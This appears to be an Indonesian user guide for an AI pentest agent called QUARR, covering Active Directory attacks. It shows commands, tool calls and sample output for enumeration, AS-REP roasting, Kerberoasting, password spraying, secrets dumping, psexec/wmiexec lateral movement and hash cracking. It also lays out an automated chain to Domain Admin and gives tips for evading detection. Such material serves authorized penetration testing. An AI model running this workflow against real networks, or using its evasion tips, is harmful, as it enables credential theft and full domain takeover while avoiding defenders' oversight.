# Panduan Pentest Active Directory — QUARR Agent

Panduan lengkap untuk penetration testing Active Directory dengan QUARR Agent.

---

## Daftar Isi

1. [Overview](#1-overview)
2. [Prasyarat](#2-prasyarat)
3. [Tools Enumerasi AD (4)](#3-tools-enumerasi-ad-4)
4. [Tools Serangan AD (7)](#4-tools-serangan-ad-7)
5. [Metodologi Serangan](#5-metodologi-serangan)
6. [Skenario: Full AD Pentest](#6-skenario-full-ad-pentest)
7. [Skenario: Serangan Tertarget](#7-skenario-serangan-tertarget)
8. [Integrasi BloodHound](#8-integrasi-bloodhound)
9. [Attack Path Umum](#9-attack-path-umum)
10. [Tips Defense Evasion](#10-tips-defense-evasion)

---

## 1. Overview

QUARR Agent menyediakan **11 tools Active Directory** untuk penetration testing AD secara komprehensif:

| Kategori | Tools | Fungsi |
|----------|-------|--------|
| **Enumerasi** | 4 tools | LDAP, RPC, pengumpulan data BloodHound |
| **Serangan** | 7 tools | Serangan Kerberos, credential dumping, lateral movement |

### Ringkasan Tool

| Tool | Impacket/Kali | Level Risiko |
|------|---------------|--------------|
| `ldap_search` | ldapsearch | Rendah |
| `ldap_domain_dump` | ldapdomaindump | Rendah |
| `bloodhound_collect` | bloodhound-python | Rendah |
| `rpc_enum` | rpcclient | Rendah |
| `kerberos_asrep_roast` | GetNPUsers.py | Tinggi |
| `kerberos_kerberoast` | GetUserSPNs.py | Tinggi |
| `password_spray` | crackmapexec | Tinggi |
| `secrets_dump` | secretsdump.py | Kritikal |
| `psexec` | psexec.py | Kritikal |
| `wmiexec` | wmiexec.py | Kritikal |
| `hash_crack` | hashcat | Rendah |

---

## 2. Prasyarat

### Tools yang Diperlukan

```bash
# Impacket suite
sudo apt install -y python3-impacket
# Atau versi terbaru via pip
pip install impacket

# CrackMapExec
sudo apt install -y crackmapexec

# LDAP tools
sudo apt install -y ldap-utils
pip install ldapdomaindump

# BloodHound
pip install bloodhound

# Password cracking
sudo apt install -y hashcat
```

### Verifikasi Instalasi

```bash
# Cek Impacket
python3 -c "from impacket import version; print(f'Impacket OK')"

# Cek CrackMapExec
crackmapexec --version

# Cek BloodHound Python
bloodhound-python --help
```

### Kebutuhan Jaringan

- Akses jaringan ke Domain Controller (DC)
- Port umum: 88 (Kerberos), 389 (LDAP), 445 (SMB), 135 (RPC)

---

## 3. Tools Enumerasi AD (4)

### ldap_search

Query LDAP untuk users, groups, computers.

```
🔐 quarr> LDAP search users di domain corp.local DC 10.10.10.10 user john password Pass123

⚙️ ldap_search(target=10.10.10.10, domain=corp.local, username=john, password=Pass123, query=users)
→ Ditemukan 150 users
→ Domain Admins: Administrator, svc_admin
→ Service accounts: svc_sql, svc_backup
```

**Anonymous LDAP (jika diizinkan):**

```
🔐 quarr> Anonymous LDAP enumeration di 10.10.10.10 domain corp.local

⚙️ ldap_search(target=10.10.10.10, domain=corp.local, query=all)
```

---

### ldap_domain_dump

Full domain dump — users, groups, computers, policies.

```
🔐 quarr> Full LDAP domain dump corp.local DC 10.10.10.10 user john password Pass123

⚙️ ldap_domain_dump(target=10.10.10.10, domain=corp.local, username=john, password=Pass123)
→ Output: /tmp/ldapdomaindump/
→ Files: domain_users.json, domain_groups.json, domain_computers.json, domain_policy.json
```

File output bisa digunakan untuk analisis offline.

---

### bloodhound_collect

Kumpulkan data untuk analisis graph BloodHound.

```
🔐 quarr> BloodHound collection di corp.local DC 10.10.10.10 user john password Pass123

⚙️ bloodhound_collect(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123)
→ Collection: Default
→ Output: /tmp/bloodhound/
→ Files: *_users.json, *_groups.json, *_computers.json, *_domains.json
```

**Metode collection:**

| Metode | Data yang Dikumpulkan |
|--------|----------------------|
| Default | Users, groups, computers, domains |
| All | Semua termasuk sessions, ACLs |
| Session | Hanya active sessions |
| ACL | Access control lists |

```
🔐 quarr> BloodHound full collection (All) di corp.local

⚙️ bloodhound_collect(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123, collection=All)
```

---

### rpc_enum

Enumerasi RPC via null session atau authenticated.

```
🔐 quarr> RPC enumeration di 10.10.10.10

⚙️ rpc_enum(target=10.10.10.10)
→ Null session: DIIZINKAN
→ Domain: CORP
→ Domain SID: S-1-5-21-...
→ Users: Administrator, Guest, john.doe, jane.smith
→ Groups: Domain Admins, Domain Users, IT Admins
```

---

## 4. Tools Serangan AD (7)

### kerberos_asrep_roast

AS-REP Roasting — ekstrak hash untuk user tanpa Kerberos pre-authentication.

```
🔐 quarr> AS-REP Roasting di domain corp.local DC 10.10.10.10

⚙️ kerberos_asrep_roast(domain=corp.local, dc_ip=10.10.10.10)
→ User vulnerable ditemukan: 2
→ svc_backup: $krb5asrep$23$svc_backup@CORP.LOCAL:...
→ svc_legacy: $krb5asrep$23$svc_legacy@CORP.LOCAL:...
→ Hash disimpan: /tmp/asrep_hashes.txt
```

**Dengan daftar user:**

```
🔐 quarr> AS-REP Roasting dengan daftar user /tmp/users.txt

⚙️ kerberos_asrep_roast(domain=corp.local, dc_ip=10.10.10.10, userlist=/tmp/users.txt)
```

---

### kerberos_kerberoast

Kerberoasting — ekstrak TGS hash untuk service accounts.

```
🔐 quarr> Kerberoast di corp.local DC 10.10.10.10 user john password Pass123

⚙️ kerberos_kerberoast(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123)
→ SPN accounts ditemukan: 3
→ svc_sql (MSSQLSvc/db01.corp.local): $krb5tgs$23$*...
→ svc_http (HTTP/web01.corp.local): $krb5tgs$23$*...
→ svc_backup (CIFS/backup01.corp.local): $krb5tgs$23$*...
→ Hash disimpan: /tmp/kerberoast_hashes.txt
```

---

### password_spray

Password spraying — test satu password terhadap banyak user.

```
🔐 quarr> Password spray di 10.10.10.10 users /tmp/users.txt password Summer2024!

⚙️ password_spray(target=10.10.10.10, userlist=/tmp/users.txt, password=Summer2024!)
→ Testing 150 users dengan password: Summer2024!
→ Kredensial valid ditemukan: 3
→ john.doe:Summer2024!
→ jane.smith:Summer2024!
→ tom.wilson:Summer2024!
```

**Protokol:**

| Protokol | Use Case |
|----------|----------|
| smb | Default, paling reliable |
| ldap | LDAP authentication |
| winrm | WinRM access |

```
🔐 quarr> Password spray via protokol LDAP

⚙️ password_spray(target=10.10.10.10, userlist=/tmp/users.txt, password=Summer2024!, protocol=ldap)
```

⚠️ **Peringatan:** Hati-hati dengan account lockout policies!

---

### secrets_dump

Dump SAM, LSA secrets, dan hash NTDS.dit.

```
🔐 quarr> Dump secrets dari DC 10.10.10.10 user Administrator password AdminPass domain corp.local

⚙️ secrets_dump(target=10.10.10.10, username=Administrator, password=AdminPass, domain=corp.local)
→ SAM hashes:
→   Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
→ Domain hashes (NTDS.dit):
→   krbtgt:502:aad3b435b51404ee:...
→   Administrator:500:aad3b435b51404ee:...
→ Output: /tmp/secrets_dump.txt
```

**Dengan hash (Pass-the-Hash):**

```
🔐 quarr> Dump secrets menggunakan NTLM hash

⚙️ secrets_dump(target=10.10.10.10, username=Administrator, password=:31d6cfe0d16ae931b73c59d7e0c089c0, domain=corp.local)
```

---

### psexec

Remote command execution via SMB (membuat service).

```
🔐 quarr> PSExec ke 10.10.10.20 user admin password Pass123 command whoami

⚙️ psexec(target=10.10.10.20, username=admin, password=Pass123, command=whoami)
→ corp\admin

🔐 quarr> PSExec interactive shell

⚙️ psexec(target=10.10.10.20, username=admin, password=Pass123)
→ Interactive shell dibuka
```

---

### wmiexec

Remote command execution via WMI (lebih stealth dari PSExec).

```
🔐 quarr> WMI exec di 10.10.10.20 user admin password Pass123 command ipconfig

⚙️ wmiexec(target=10.10.10.20, username=admin, password=Pass123, command=ipconfig)
→ Windows IP Configuration
→ Ethernet adapter Ethernet0:
→   IPv4 Address: 10.10.10.20
```

---

### hash_crack

Crack hash yang didapat dengan hashcat.

```
🔐 quarr> Crack Kerberoast hashes /tmp/kerberoast_hashes.txt mode 13100

⚙️ hash_crack(hash_file=/tmp/kerberoast_hashes.txt, mode=13100)
→ Cracking dengan rockyou.txt...
→ Cracked: 2/3
→ svc_sql:Summer2024!
→ svc_http:Password123
```

**Mode hashcat umum:**

| Mode | Tipe Hash |
|------|-----------|
| 1000 | NTLM |
| 13100 | Kerberos 5 TGS-REP (Kerberoast) |
| 18200 | Kerberos 5 AS-REP (AS-REP Roast) |
| 5600 | NetNTLMv2 |

---

## 5. Metodologi Serangan

### Fase 1: Reconnaissance

```
Network Discovery → Service Enumeration → Identifikasi DC
```

```
🔐 quarr> Network discovery 10.10.10.0/24

⚙️ network_discovery(target=10.10.10.0/24)
→ 10.10.10.10 (DC01)
→ 10.10.10.20 (WORKSTATION01)
→ 10.10.10.30 (FILESERVER01)

🔐 quarr> Service enumeration 10.10.10.10

⚙️ service_enumeration(target=10.10.10.10, profile=full)
→ 88/tcp Kerberos
→ 389/tcp LDAP
→ 445/tcp SMB
→ 636/tcp LDAPS
→ Teridentifikasi sebagai Domain Controller
```

### Fase 2: Enumerasi

```
LDAP → RPC → BloodHound → Identifikasi target
```

```
🔐 quarr> Full AD enumeration di corp.local DC 10.10.10.10

Agent menjalankan:
1. rpc_enum (null session)
2. ldap_search (anonymous atau dengan creds)
3. ldap_domain_dump
4. bloodhound_collect
```

### Fase 3: Initial Access

```
AS-REP Roast → Kerberoast → Password Spray → Crack hashes
```

```
🔐 quarr> Coba serangan initial access di corp.local DC 10.10.10.10

Agent menjalankan:
1. kerberos_asrep_roast (tanpa creds)
2. kerberos_kerberoast (jika creds tersedia)
3. password_spray (dengan password umum)
4. hash_crack (pada hash yang didapat)
```

### Fase 4: Privilege Escalation & Lateral Movement

```
Secrets dump → PSExec/WMIExec → Ulangi
```

```
🔐 quarr> Lateral movement ke 10.10.10.20 dengan kredensial yang didapat

⚙️ wmiexec(target=10.10.10.20, username=svc_sql, password=Summer2024!, command=whoami /all)
```

### Fase 5: Domain Dominance

```
Akses DC → NTDS dump → Golden Ticket (manual)
```

```
🔐 quarr> Dump semua domain hashes dari DC

⚙️ secrets_dump(target=10.10.10.10, username=Administrator, password=AdminPass, domain=corp.local)
```

---

## 6. Skenario: Full AD Pentest

### Pentest Full Otomatis

```
🔐 quarr> Full AD pentest di network 10.10.10.0/24 domain corp.local

Agent otomatis menjalankan:

1. network_discovery(10.10.10.0/24)           ← Temukan host
2. service_enumeration(DC)                     ← Identifikasi DC
3. rpc_enum(DC)                               ← Null session enum
4. ldap_search(DC, anonymous)                 ← Anonymous LDAP
5. kerberos_asrep_roast(corp.local, DC)       ← AS-REP Roast
   ↓ [Jika hash ditemukan]
6. hash_crack(asrep_hashes, mode=18200)       ← Crack AS-REP
   ↓ [Jika creds didapat]
7. ldap_domain_dump(DC, creds)                ← Full domain dump
8. bloodhound_collect(corp.local, creds)      ← Data BloodHound
9. kerberos_kerberoast(corp.local, creds)     ← Kerberoast
10. hash_crack(kerberoast_hashes, mode=13100) ← Crack Kerberoast
    ↓ [Jika creds lagi]
11. password_spray(DC, users, password)       ← Password spray
12. secrets_dump(target, admin_creds)         ← Dump secrets
→ Report + Findings
```

---

## 7. Skenario: Serangan Tertarget

### AS-REP Roasting Saja

```
🔐 quarr> Serangan AS-REP Roasting di corp.local DC 10.10.10.10

⚙️ kerberos_asrep_roast(domain=corp.local, dc_ip=10.10.10.10)
→ Ditemukan 2 akun vulnerable

🔐 quarr> Crack AS-REP hashes

⚙️ hash_crack(hash_file=/tmp/asrep_hashes.txt, mode=18200)
```

### Kerberoasting Chain

```
🔐 quarr> Kerberoast dengan creds john:Pass123 di corp.local DC 10.10.10.10

⚙️ kerberos_kerberoast(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123)

🔐 quarr> Crack Kerberoast hashes dengan wordlist custom

⚙️ hash_crack(hash_file=/tmp/kerberoast_hashes.txt, mode=13100, wordlist=/usr/share/wordlists/custom.txt)
```

### Lateral Movement Chain

```
🔐 quarr> Dengan svc_sql:Summer2024!, move ke 10.10.10.30

⚙️ wmiexec(target=10.10.10.30, username=svc_sql, password=Summer2024!, domain=corp.local, command=whoami)

🔐 quarr> Dump local hashes dari 10.10.10.30

⚙️ secrets_dump(target=10.10.10.30, username=svc_sql, password=Summer2024!, domain=corp.local)
```

### Path ke Domain Admin

```
🔐 quarr> Saya punya local admin di 10.10.10.30. Cari path ke Domain Admin.

Agent menganalisis data BloodHound:
→ svc_sql → GenericAll di FILESERVER01 → Session DA admin.jones
→ Rekomendasi: Dump credentials dari FILESERVER01

🔐 quarr> Dump secrets dari 10.10.10.30

⚙️ secrets_dump(target=10.10.10.30, username=svc_sql, password=Summer2024!)
→ Ditemukan: admin.jones NTLM hash
```

---

## 8. Integrasi BloodHound

### Kumpulkan Data

```
🔐 quarr> BloodHound collection corp.local DC 10.10.10.10 user john password Pass123 method All

⚙️ bloodhound_collect(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123, collection=All)
→ Output: /tmp/bloodhound/*.json
```

### Import ke BloodHound GUI

```bash
# Start neo4j
sudo neo4j start

# Start BloodHound
bloodhound

# Import file JSON via GUI
# Drag and drop files dari /tmp/bloodhound/
```

### Query Umum

Setelah import, gunakan BloodHound GUI untuk mencari:

1. **Shortest Path to Domain Admin**
2. **Kerberoastable Users**
3. **AS-REP Roastable Users**
4. **Unconstrained Delegation**
5. **Users with DCSync Rights**

---

## 9. Attack Path Umum

### Path 1: AS-REP → Kerberoast → DA

```
AS-REP Roast → Dapat creds svc_backup →
Kerberoast (dengan creds) → Dapat creds svc_sql →
svc_sql punya GenericAll di DC → DCSync → DA
```

### Path 2: Password Spray → Lateral → DA

```
Password Spray → Dapat creds john.doe →
john.doe bisa RDP ke WORKSTATION01 →
Local admin dump creds → Temukan cached DA creds
```

### Path 3: Kerberoast → Service Account → DA

```
Kerberoast → Dapat creds svc_http →
svc_http jalan di WEBSERVER dengan SeImpersonate →
Potato attack → SYSTEM → Dump creds → DA hash
```

### Path 4: BloodHound ACL Abuse

```
Low-priv user → GenericWrite di user2 →
Set SPN di user2 → Kerberoast user2 →
user2 di Server Operators → DA
```

---

## 10. Tips Defense Evasion

### Hindari Deteksi

| Aksi | Tips Evasion |
|------|--------------|
| Enumerasi | Gunakan ldap_search daripada scan yang berisik |
| Password Spray | Batasi 1 percobaan per user per jam |
| Lateral Movement | Gunakan wmiexec (tanpa service creation) daripada psexec |
| Credential Dumping | Target mesin spesifik, bukan semua |

### Tips Per Tool

```
# Kerberoast lebih tenang (request lebih sedikit tiket)
🔐 quarr> Kerberoast hanya SPN high-value

# Gunakan LDAPS jika memungkinkan
🔐 quarr> LDAP search di port 636 (LDAPS)

# WMI lebih stealth dari PSExec
🔐 quarr> Gunakan WMI exec daripada PSExec untuk lateral movement
```

### OpSec Checklist

- [ ] Cek account lockout policy sebelum spraying
- [ ] Gunakan jam kerja yang valid untuk aktivitas
- [ ] Minimalisir BloodHound collection (Default vs All)
- [ ] Bersihkan setelah secrets dump
- [ ] Monitor traffic sendiri untuk signatures
